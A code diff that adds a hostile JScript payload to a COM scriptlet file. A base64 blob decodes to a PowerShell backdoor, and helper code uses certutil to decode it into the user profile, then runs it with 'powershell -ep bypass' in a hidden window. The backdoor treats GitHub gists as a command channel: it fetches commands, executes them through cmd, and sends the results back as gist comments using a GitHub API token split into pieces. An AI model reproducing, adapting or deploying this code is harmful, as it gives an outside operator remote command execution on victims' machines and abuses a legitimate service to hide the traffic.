@@ -1,6 +1,68 @@
 <?XML version="1.0"?>
 <scriptlet>
 <registration 
-    progid="PoC"
+    progid="P"
     classid="{F0001111-0000-0000-0000-0010FEEDACDC}" >
 	<script language="JScript">
+		<![CDATA[
+		
+		
+		var psm="JGdpc3RzVXNlcj0idGVkbWlsbGVyZGF5IjsgJHQxPSI4OTZhMCI7ICRjaGVja1RpbWU9NjA7ICR0Mj0iM2Q2YjA5NzRlZjY0N2FlOTRmNjMiOyAkdDM9IjYyNjMwNjQ2NDhkYWViMCI7ICRnaXN0c0FwaVRva2VuPSR0MSskdDIrJHQzOyBmdW5jdGlvbiBzZW5kUmVzdWx0KCRyKXsgdHJ5eyAkZW5jb2RlUmVzdWx0PVtTeXN0ZW0uV2ViLkh0dHBVdGlsaXR5XTo6VXJsRW5jb2RlKFtzeXN0ZW0uU3RyaW5nXTo6Sm9pbigiYHJgbiIsJHIpKTsgJHdlYmNsaWVudC5IZWFkZXJzLkFkZCgidXNlci1hZ2VudCIsICJVc2VyLUFnZW50LE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNS4wOzspIik7ICRyPSR3ZWJjbGllbnQuVXBsb2FkU3RyaW5nKCRjbWRHaXN0LmNvbW1lbnRzX3VybCwieyIiYm9keSIiOiIiJGVuY29kZVJlc3VsdCIifSIpOyB9Y2F0Y2h7ICRlbmNvZGVSZXN1bHQ9W1N5c3RlbS5XZWIuSHR0cFV0aWxpdHldOjpVcmxFbmNvZGUoW3N5c3RlbS5TdHJpbmddOjpKb2luKCJgcmBuIiwkXykpOyR3ZWJjbGllbnQuSGVhZGVycy5BZGQoInVzZXItYWdlbnQiLCAiVXNlci1BZ2VudCxNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDs7KSIpOyAJJHI9JHdlYmNsaWVudC5VcGxvYWRTdHJpbmcoJGNtZEdpc3QuY29tbWVudHNfdXJsLCJ7IiJib2R5IiI6IiIkZW5jb2RlUmVzdWx0IiJ9Iik7IH0gfSBmdW5jdGlvbiBwYXJzZUNvbW1hbmQoJGNvbW1hbmQpeyAkanNvbkNvbW1hbmRTdHI9InsiKyRjb21tYW5kKyJ9IjsgdHJ5eyAJIFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5XZWIuRXh0ZW5zaW9ucyIpOyAJJHNlciA9IE5ldy1PYmplY3QgU3lzdGVtLldlYi5TY3JpcHQuU2VyaWFsaXphdGlvbi5KYXZhU2NyaXB0U2VyaWFsaXplcjsgCSRqc29uQ29tbWFuZCA9ICRzZXIuRGVzZXJpYWxpemVPYmplY3QoJGpzb25Db21tYW5kU3RyKTsgfWNhdGNoeyAJc2VuZFJlc3VsdCgiRVJST1I6ICRfIik7IH0gaWYoJGpzb25Db21tYW5kIC1hbmQgJGpzb25Db21tYW5kLkNvbW1hbmQubGVuZ3RoIC1ndCAwKXsgCSAkY29tbWFuZFN0cj0kanNvbkNvbW1hbmQuQ29tbWFuZDsgCSBpZigkY29tbWFuZFN0cil7IAkgJHJlc3VsdCA9IGNtZCAvYyAoJGNvbW1hbmRTdHIrIiAyPiYxIik7IAkgc2VuZFJlc3VsdCgiQ29tbWFuZCBSZXN1bHQgZm9yICRjb21tYW5kU3RyIDpgcmBuIiskcmVzdWx0KTsgCSB9IH0gfSAkb2xkQ29tbWFuZD0iIjsgJHdlYmNsaWVudD1uZXctb2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50OyAkdXBhc3M9W1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiJHtnaXN0c1VzZXJ9OiR7Z2lzdHNBcGlUb2tlbn0iKTsgJGF1dGhIZWFkZXI9IkJhc2ljICIrW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJHVwYXNzKTsgJHdlYmNsaWVudC5IZWFkZXJzLkFkZCgiQXV0aG9yaXphdGlvbiIsJGF1dGhIZWFkZXIpOyAkaGVhZGVyeD0iVXNlci1BZ2VudCxNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDs7KSI7JHdlYmNsaWVudC5IZWFkZXJzLkFkZCgidXNlci1hZ2VudCIsJGhlYWRlcngpOw0Kd2hpbGUoMSl7IFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYwOyAkd2ViY2xpZW50LkhlYWRlcnMuQWRkKCJ1c2VyLWFnZW50IiwgJGhlYWRlcngpOyAkZ2lzdHM9JHdlYmNsaWVudC5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9naXN0cycpO1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoIlN5c3RlbS5XZWIuRXh0ZW5zaW9ucyIpOyAkc2VyID0gTmV3LU9iamVjdCBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJpYWxpemF0aW9uLkphdmFTY3JpcHRTZXJpYWxpemVyOyAkanNvbkdpc3RzID0gJHNlci5EZXNlcmlhbGl6ZU9iamVjdCgkZ2lzdHMpOyAkY21kSWQ9IiI7ICRjbWRHaXN0PXt9OyBmb3JlYWNoICgkb25lR2lzdCBpbiAkanNvbkdpc3RzKXsgCSBpZigoJG9uZUdpc3RbImZpbGVzIl0uY21kICkgLWFuZCAoJG9uZUdpc3RbImZpbGVzIl0uY21kLmZpbGVuYW1lIC1lcSAiY21kIikpeyAJICRjbWRJZD0kb25lR2lzdC5pZDsgCSAkY21kR2lzdD0kb25lR2lzdDsgCSBicmVhazsgCSB9IH0gJGNvbW1hbmQ9IiI7IGlmKCgkY21kSWQubGVuZ3RoIC1ndAkwKSAtYW5kCSgkY21kR2lzdC51cmwubGVuZ3RoIC1ndCAwKSl7ICR3ZWJjbGllbnQuSGVhZGVycy5BZGQoInVzZXItYWdlbnQiLCRoZWFkZXJ4KTsgJGNtZEdpc3RDb250ZW50PSR3ZWJjbGllbnQuRG93bmxvYWRTdHJpbmcoJGNtZEdpc3QudXJsKTsgW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLldlYi5FeHRlbnNpb25zIik7ICRzZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5XZWIuU2NyaXB0LlNlcmlhbGl6YXRpb24uSmF2YVNjcmlwdFNlcmlhbGl6ZXI7ICRjbWRHaXN0RGV0YWlsID0gJHNlci5EZXNlcmlhbGl6ZU9iamVjdCgkY21kR2lzdENvbnRlbnQpOyAkY29tbWFuZD0kY21kR2lzdERldGFpbFsiZmlsZXMiXS5jbWQuY29udGVudDsgfSBpZigkY29tbWFuZCAtYW5kICgkY29tbWFuZCAtbmUgJG9sZENvbW1hbmQpKXsgJGNvbW1hbmRMaXN0PSRjb21tYW5kLnNwbGl0KCJgbiIpOyBmb3JlYWNoICgkb25lQ29tbWFuZCBpbiAkY29tbWFuZExpc3QpeyBwYXJzZUNvbW1hbmQoJG9uZUNvbW1hbmQpOyB9ICRvbGRDb21tYW5kPSRjb21tYW5kOyB9IH0g";
+
+		var psm_name="conm.ps1";
+		var psm_txt="comm.tmp"
+
+		var TEMPPATH = "%USERPROFILE%";
+
+		function ExecuteFile(filepath) {
+			var x;
+			x = new ActiveXObject("Wscript.Shell");
+			x.run(filepath,0,true);
+		}
+
+		function Decode(SourcePath,DestPath) {
+			var x;
+			x = new ActiveXObject("Wscript.Shell");
+			x.run("certutil.exe /f /decode "+SourcePath+" "+DestPath,0,true);
+		}
+
+		function DeleteFile(filepath) {
+			var fso = new ActiveXObject("Scripting.FileSystemObject");
+			fso.DeleteFile(filepath);
+		}
+
+		function GetTempPath() {
+			var x = new ActiveXObject("Wscript.Shell");
+			var path = x.ExpandEnvironmentStrings(TEMPPATH);
+			return path;
+		}
+
+
+
+		function WriteTextToFile (filename,content) {
+			var fso = new ActiveXObject("Scripting.FileSystemObject");
+			var f = fso.CreateTextFile(filename, true);
+			f.Write(content);
+			f.Close();
+		}
+
+
+		try {
+			var temp_path = GetTempPath();
+			
+			var psm_txt_path = temp_path + "\\" + psm_txt;
+			var psm_path = temp_path + "\\" + psm_name;
+			WriteTextToFile(psm_txt_path,psm);
+			Decode(psm_txt_path,psm_path);
+			ExecuteFile("cmd.exe /c del "+psm_txt_path);
+			ExecuteFile("powershell -ep bypass "+psm_path);
+
+		} catch(e) {
+			e.toString();
+		}
+
+	
+		]]>
+</script>
+</registration>
+</scriptlet>
